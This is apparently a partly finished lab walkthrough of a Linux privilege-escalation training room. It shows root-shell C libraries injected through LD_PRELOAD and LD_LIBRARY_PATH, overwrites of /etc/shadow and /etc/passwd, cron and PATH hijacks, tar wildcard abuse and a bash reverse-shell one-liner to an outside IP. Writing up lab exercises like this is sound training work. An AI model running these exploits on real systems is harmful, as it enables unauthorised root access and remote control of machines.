# Linux Privilege Escalation room

[1. Intro](#Intro)

[2. Service Exploits](#service-exploits)

[3. Weak File Permissions - Readable /etc/shadow](#weak-file-permissions---readable-etcshadow)

[4. Weak File Permissions - Writeable /etc/shadow](#weak-file-permissions---writeable-etcshadow)

[5. Weak File Permissions - Writeable /etc/passwd](#weak-file-permisions---writeable-etcpasswd)

[6. Sudo - Shell Escape Sequences](#sudo---shell-escape-sequences)

[7. Sudo - Environment Variables](#sudo---environment-variables)

[8. Cron Jobs - File Permissions](#cron-jobs---file-permissions)

[9. Cron Jobs - PATH Environment Variables](#cron-jobs---path-environment-variables)

[10. Cron Jobs - Wildcards](#cron-jobs---wildcards)

[11. SUID/SGID Executables - Know Exploits](#suidsgid-executables---know-exploits)

[12. SUID/SGID Executables - Shared Object Injection](#suidsgid-executables---shared-object-injection)

[13. SUID/SGID Executables - Environment Variables](#suidsgid-executables---environment-variables)

[14. SUID/SGID Executables - Abusing Shell Features 1](suidsgid-executables---abusing-shell-features-1)

[15. SUID/SGID Executables - Abusing Shell Features 1](suidsgid-executables---abusing-shell-features-2)

[16. Passwords & Keys - History Files](#passwords--keys---history-files)

[17. Passwords & Keys - Config Files](#passwords--keys---config-files)

[18. Password & Keys - SSH Keys](#passwords--keys---ssh-keys)

[19. NFS](#nfs)

[20. Kernel Exploits](#kernel-exploits)

[21. Privilege Escalation Scripts](#privilege-escalation-scripts)


## Intro

![image](https://user-images.githubusercontent.com/83407557/183507502-83e1552c-3506-41c3-a521-78ce3ab0764b.png)


The above method does not work if you are using the VPN. You will get the following error.

![image](https://user-images.githubusercontent.com/83407557/183533330-cf27195b-086c-4bb3-9a88-b6110f9364ba.png)

![image](https://user-images.githubusercontent.com/83407557/183533390-b949b0bf-ad63-4af7-94e0-e721c91185d1.png)


The fix is to run the ssh command with the following added flag:

`ssh -oHostKeyAlgorithms=+ssh-dss user@10.10.197.141`

I am going to load in LinPEAs at the onset, just to get an idea of what will get picked up from the vulns in this room. First I will check that I have wget and python on the target to transfer files. Then I will spin up a python server on my local kali instance to transfer LinPEAs.

![image](https://user-images.githubusercontent.com/83407557/183534243-f43ef0fc-51c4-4ad2-856a-983291535954.png)

With this script from carlospolop, I can easily spot low hanging fruit, as well as scan for things I may have overlooked with just manual enumeration. 

## Service Exploits

mysql is found to be running as root, and the root "user" has no password set

![image](https://user-images.githubusercontent.com/83407557/183640155-c03f3a9f-2d5b-46ff-aa19-8bfc5e0d1ef9.png)

![image](https://user-images.githubusercontent.com/83407557/183534783-306f8b45-9031-4660-aa30-ecf1dc58aaa4.png)


 Verifying I can log in as root via mysql
 
 ![image](https://user-images.githubusercontent.com/83407557/183534914-171ca9bf-7def-4406-929b-284f03d15262.png)


### Exploit

There is an exploit that uses User Defined Functions(UDFs) and lets me run system commands as root via the MySQL service.
https://www.exploit-db.com/exploits/1518

![image](https://user-images.githubusercontent.com/83407557/183535466-9d94dd62-0f25-45b2-9fd0-b9f55d03a6f8.png)

I can grab this exploit locally and send it again with python and wget

![image](https://user-images.githubusercontent.com/83407557/183535960-9186e6b2-9857-4e95-8ce8-fa8d98792c42.png)


Then compile it on target and use MySQL to create UDF "do_system" then use the function to copy /bin/bash to /tmp/rootbash.

![image](https://user-images.githubusercontent.com/83407557/183536636-304c82e2-3f03-4bfb-82d7-898f829fb5b1.png)


## Weak File Permissions - Readable /etc/shadow

![image](https://user-images.githubusercontent.com/83407557/183643562-91a4787a-eae7-44de-9b5e-d0c8911e3c3b.png)


The /etc/shadow file is where linux stores user's password hashes. If readable, it is possible to extract the hashes and crack them.

![image](https://user-images.githubusercontent.com/83407557/183640988-96e68159-991b-47d8-b9e4-ed8e2b158e69.png)

Using the rockyou.txt wordlist and hashcat, both extracted hashes are crackable 

![image](https://user-images.githubusercontent.com/83407557/183641879-31adcf4c-349d-4865-a012-478dfedb6d80.png)

Now on the target system I can use the su command to become the root user

![image](https://user-images.githubusercontent.com/83407557/183642307-7d715767-5883-403c-82dd-ab030e15d7f9.png)


## Weak File Permissions - Writeable /etc/shadow

As can be seen by the yellow, /etc/shadow being world-writeable is a low hanging fruit privilege escalation. 

![image](https://user-images.githubusercontent.com/83407557/183643893-9be50e0e-7668-4ccf-a7a8-912352d6aa6b.png)

For this privesc cracking the hashes is not required, and you lock the actual root user out of their own account. Simply create a hash of a password you know and replace the hash you dont know. Then su to root:

![image](https://user-images.githubusercontent.com/83407557/183647823-6d26b77a-7387-4a88-9f5b-5fa565215a17.png)

Checking that I can write to the file, and making a copy (always make a copy)

![image](https://user-images.githubusercontent.com/83407557/183648088-7fafe26d-a2be-43cc-8a89-10efe9b9459a.png)

Making my own hash with `mkpasswd -m sha-512 mypassword`

![image](https://user-images.githubusercontent.com/83407557/183648523-e01e6f9f-a8f7-498a-a925-d5a3b3c6808e.png)

Using sed to edit the file

`sed -i 's#find#replace#g file'`

`sed -i 's#$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0#$6$QGZ7v32ukVS6Y$3cx2VP4LESpvEBto4jj2evGx1uOb.ghTU2Y8PTmsIMLeIZpTogPa09rkBDCxOs8lUyDTvLg/qzX276syveGNV0#g' /tmp/shadow`

![image](https://user-images.githubusercontent.com/83407557/183652382-dad34534-983b-477f-a69b-d2c67618c84d.png)



I then switch it back to continue on with the lab

![image](https://user-images.githubusercontent.com/83407557/183652623-4190198b-6186-4bf6-82c4-5016200ba42e.png)

## Weak File Permissions - Writeable /etc/passwd

![image](https://user-images.githubusercontent.com/83407557/183643893-9be50e0e-7668-4ccf-a7a8-912352d6aa6b.png)

Before there was a shadow file the system hashes were stored on the passwd file. If this is writeable, the shadow file can be bypassed altogether. The attack works in almost the same way as a writeable shadow file, but with this we can also add a new root user.

As can be seen the X indicates that linux check the shadow file for the password hash.

![image](https://user-images.githubusercontent.com/83407557/183653444-cb813421-a7f9-4f80-b184-fc96ba3065fe.png)

Changing the root password

![image](https://user-images.githubusercontent.com/83407557/183655779-6ffc90f8-4f36-4674-bebe-3684c1bdf21f.png)

alternatively I can take that same password that I made, and create my own new root user with echo and piping it to /etc/passwd

`echo 'newroot:wikA5rxUytB.I:0:0:root:/root:/bin/bash'>>/etc/passwd`

![image](https://user-images.githubusercontent.com/83407557/183656753-fe9ace82-00ad-4ed9-9844-c0a568038482.png)


## Sudo - Shell Escape Sequences

Certain programs run with sudo offer a path to privesc. To find locally what the current user can run as root use `sudo -l`

![image](https://user-images.githubusercontent.com/83407557/183660441-356dc07f-170e-4def-b14b-9888c8ac329e.png)

Linpeas will also show which of these binaries are definite paths to privesc

![image](https://user-images.githubusercontent.com/83407557/183661872-fe85d10c-83df-4401-951e-df8a74452624.png)


[Get The Fuck Out Bins](https://gtfobins.github.io/) Is a great resource to use for finding escape sequences with the binaries found.

![image](https://user-images.githubusercontent.com/83407557/183661384-e70f2c55-f22c-498c-b50c-f647929e6486.png)

With this info I can perform shell escapes with each of the binaries marked in yellow by linpeas

iftop

![image](https://user-images.githubusercontent.com/83407557/183664899-befb95ab-3d3e-49c5-a432-1a2bb655ab2c.png)

![image](https://user-images.githubusercontent.com/83407557/183664812-1b74e9da-10ae-44ab-bb4d-a3a7a509bdb5.png)

![image](https://user-images.githubusercontent.com/83407557/183664944-25d50310-6b40-4ac8-8589-14f2e26f7911.png)


find
![image](https://user-images.githubusercontent.com/83407557/183665212-907b18bb-672d-4372-9eaa-9f8d815f9195.png)

![image](https://user-images.githubusercontent.com/83407557/183665377-79da2d96-15d0-4723-b506-8f997bd9c9ea.png)

nano

![image](https://user-images.githubusercontent.com/83407557/183665495-750426a6-332e-42d5-a87e-5327a1910212.png)


![image](https://user-images.githubusercontent.com/83407557/183665835-24e1a495-cf5d-492d-a98d-319691e9878f.png)

found this method lets you run commands, but you cannot see typing: example of whoami and id

![image](https://user-images.githubusercontent.com/83407557/183666917-b9d51e97-bc32-4446-a2be-e3e3b40df124.png)



vim

![image](https://user-images.githubusercontent.com/83407557/183667526-585944d7-f4c1-432c-81b0-063399835b42.png)

![image](https://user-images.githubusercontent.com/83407557/183667596-8e824aff-fec9-4ded-919b-1d14d9033ec0.png)


man

![image](https://user-images.githubusercontent.com/83407557/183667684-b3fe2391-0c21-44ca-a06d-b4f29e3d8c2d.png)

![image](https://user-images.githubusercontent.com/83407557/183668011-fbc7279c-6ac0-45f0-9357-f964931132d2.png)

![image](https://user-images.githubusercontent.com/83407557/183668109-78f0b1e0-9c1d-4f5a-810a-7cc06a4217de.png)

![image](https://user-images.githubusercontent.com/83407557/183668204-e05537d3-f8db-4a20-a7da-637571154d83.png)


awk

![image](https://user-images.githubusercontent.com/83407557/183668350-e34f9c89-3af5-4eae-beca-876390d61e14.png)

![image](https://user-images.githubusercontent.com/83407557/183668454-2a60204a-0652-4b4a-a86d-087fcc6fe0bc.png)


less

![image](https://user-images.githubusercontent.com/83407557/183668596-93b2de52-115c-4318-876b-65e4a6b15684.png)

![image](https://user-images.githubusercontent.com/83407557/183668788-5243d3bd-3811-4298-be49-94b5c51341a0.png)


ftp

![image](https://user-images.githubusercontent.com/83407557/183668878-0547f007-a40d-4104-88c5-3ff794342be2.png)

![image](https://user-images.githubusercontent.com/83407557/183669115-6d9c4373-cb99-4b81-b637-3a11cd9b724e.png)


nmap

![image](https://user-images.githubusercontent.com/83407557/183669458-375f1d78-c55b-4016-8405-9b21da8ebe72.png)


![image](https://user-images.githubusercontent.com/83407557/183669398-b7c6c294-dd7a-4836-963d-57530ac1bd25.png)

or 

![image](https://user-images.githubusercontent.com/83407557/183669640-2c50dccf-d8c0-4a6e-b243-243c9f6cb7a7.png)


more

![image](https://user-images.githubusercontent.com/83407557/183669747-b1555a0d-1bed-4079-bb85-8933df2b7305.png)

![image](https://user-images.githubusercontent.com/83407557/183669950-a08f107b-dddf-418c-b96d-07e0eb307baa.png)



## Sudo - Environment Variables

The following attack is akin to DLL injection on Windows targets. What is required is a user that has sudo permissions to any binary, and that the LD_PRELOAD or LD_LIBRARY_PATH have the ability to persist(as env variables reset by default).

An example of how env variables reset (note that under Defaults env_reset is active)

![image](https://user-images.githubusercontent.com/83407557/183677801-2b86131b-4689-4c3d-9fc6-d8f2326003e0.png)

Showing that the Env Variable PWD for print working directory resets for root:

![image](https://user-images.githubusercontent.com/83407557/183679001-3526cc6a-229f-41fb-8fd8-40d5c8eedd10.png)

Notice however that on the target Linux machine the env_keep is set for the two env variables I need to perform this attack, as well as several programs I can also use.

![image](https://user-images.githubusercontent.com/83407557/183683506-b128dc18-0fe1-4e37-94d4-a48e12655946.png)

since I have vim on the list I can also see this in the /etc/sudoers file

![image](https://user-images.githubusercontent.com/83407557/183683920-3a14b01a-e022-4c51-879d-1e8061f6f368.png)

### LD_LIBRARY_PATH

To abuse this I can use the following C code
Note that the code contains a single function that will unset the LD_LIBRARY_PATH variable, and spawn a root bash shell

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

I am going to target the only binary that I have sudo access too (apache2) that I did not exploit via a shell escape. First I need to see which shared libraries are used by the program with ldd

![image](https://user-images.githubusercontent.com/83407557/183686555-58dde9ae-31f8-4ec4-aaa1-518c2e6e6af3.png)

I note that the program uses 12 different libraries, I use cut to add them to a file

![image](https://user-images.githubusercontent.com/83407557/183687705-41c43c12-837a-41ef-815d-284abe941d3f.png)

I pick one of the libraries and compile my exploit with the same name

`gcc -o /tmp/libcrypt.so.1 -shared -fPIC lib_path.c`

then using sudo with LD_LIBRARY_PATH set to my malicious lib I get a root shell

![image](https://user-images.githubusercontent.com/83407557/183690738-92f5098f-1ed2-4427-b66e-df05633caf0a.png)

doing the same with libpthread.so.0

`gcc -o /tmp/libpthread.so.0 -shared -fPIC lib_path.c`

![image](https://user-images.githubusercontent.com/83407557/183691857-182f6701-575f-4aa9-8165-0a2e81dc926c.png)


### LD_PRELOAD

This attack allows us to inject a shared object into the program before it is run.

Almost identical code that unsets the LD_PRELOAD variable and spawns a root bash shell

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Creating with nano

![image](https://user-images.githubusercontent.com/83407557/183692721-fca855fd-2f7b-46a1-9f18-48c864a0b6aa.png)


compiling

`gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c`

running

`sudo LD_PRELOAD=/tmp/preload.so program-name-here`

apache2 example

![image](https://user-images.githubusercontent.com/83407557/183694347-0ed7facc-90ad-48a7-a467-4c73e91bf040.png)

various other sudo programs will also work, each time I get a root shell before the program even loads


![image](https://user-images.githubusercontent.com/83407557/183695078-2065f98d-9afa-4060-b216-692d5e378423.png)

## Cron Jobs - File Permissions

Checking cron jobs with cat /etc/crontab I see that root is running two

![image](https://user-images.githubusercontent.com/83407557/183709294-0a95b2ca-e420-44bd-9363-53e7e0f5c559.png)


### overwrite.sh

checking where it is and if I can write to it

![image](https://user-images.githubusercontent.com/83407557/183709595-8a4c2bfe-73e7-4aa4-bd01-7b8bb2d66f57.png)


Checking contents

![image](https://user-images.githubusercontent.com/83407557/183709872-900798e2-f189-4cb4-bfbb-c733dd6f12a0.png)

okay, so it write the date command output to a file called useless every 2 mins, but I can add my own bash revere-shell 1 liner `bash -i >& /dev/tcp/10.6.77.38/9001 0>&1` to the file with echo

![image](https://user-images.githubusercontent.com/83407557/183710483-f0cf3148-f946-485e-a495-c30bc84b8ffc.png)

then after a minute or so I get a callback

![image](https://user-images.githubusercontent.com/83407557/183710591-6bba696d-fa3e-47ab-a9f3-16daaf243fc8.png)


## Cron Jobs - PATH Environment Variables

Taking another look at the crontab I see that the first part of path is a directory I control (/home/user)

![image](https://user-images.githubusercontent.com/83407557/183711056-b58d124d-1521-43d7-b3cf-f32f48b01b8b.png)

This time instead of a rev shell I will just get a script to spawn a local root shell and naming it overwrite.sh. When the cronjob runs it will check for the program in my home directory first, therefore executing my script as root.

malicious overwrite.sh saved to /home/user

```bash
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

After using chmod +x to make it executable it will run via cron

waiting a minute for the cronjob to execute, after checking the file now exists I can spawn a root shell with `/tmp/rootbash -p`

does it exist?

![image](https://user-images.githubusercontent.com/83407557/183713914-aea5f5a3-813e-4a43-bafb-6b5051a0c025.png)

executing

![image](https://user-images.githubusercontent.com/83407557/183714001-357d2b87-71d6-4ae7-b2b7-37aa99381f01.png)


## Cron Jobs - Wildcards

Looking at the contents of the other cron job being run as root I see a wildcare character "*"

```bash
rootbash-4.1# cat /usr/local/bin/compress.sh
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```
Looking at the GTFObins for tar, you can see that command line arguments can be used to get a shell. 

![image](https://user-images.githubusercontent.com/83407557/183714722-00d6ca97-ec72-42db-8305-3d95b559707a.png)

Since the wildcard is used in the cronjob tar being run as root will try and tar all the files, however if I name files the same as the commands, I can point them at a malicious rev shell binary.

First I need to make a milicous .elf file with msfvenom and transfer it over to the target

![image](https://user-images.githubusercontent.com/83407557/183715871-e80c9028-e085-4eaa-b645-3629a41ccafc.png)

Then I start a listener on kali, and add two files that will act as my arguments to the tar command

![image](https://user-images.githubusercontent.com/83407557/183716379-d39c4314-ff93-4c29-93e1-e66271937692.png)

After a minute, tar executes my elf as root and I get a callback

![image](https://user-images.githubusercontent.com/83407557/183716709-e5171857-7fd6-47b6-bc68-3ed64a8fc7ac.png)

## SUID/SGID Executables - Know Exploits
The CLI command in bash to find SUID/SGID executables

`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`

![image](https://user-images.githubusercontent.com/83407557/183718330-891c6b35-bd28-4323-b485-c67bb8bf801b.png)
 
Checking on of these executables in searchploit, shows that our exact version has an expliot

![image](https://user-images.githubusercontent.com/83407557/183720861-e1378910-57b9-478f-aba0-82e5a6de0909.png)

viewing and copying the exploit to my clipboard

![image](https://user-images.githubusercontent.com/83407557/183721450-2a2c8804-cd2c-4717-a529-4f5cb819c0a1.png)

creating on target and executing 

![image](https://user-images.githubusercontent.com/83407557/183721712-247baac0-4524-4755-aec4-e5c6b81ad7fa.png)




## SUID/SGID Executables - Shared Object Injection

Finding SUID/SGID executables:

```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
Checking for open/access calls and for "no such file" errors

```bash
strace path-to-file 2>&1 | grep -iE "open|access|no such file"
```
One of the executables stands out



## SUID/SGID Executables - Environment Variables

## SUID/SGID Executables - Abusing Shell Features 1

## SUID/SGID Executables - Abusing Shell Features 2

## Passwords & Keys - History Files

## Passwords & Keys - Config Files

## Password & Keys - SSH Keys

## NFS

## Kernel Exploits

## Privilege Escalation Scripts
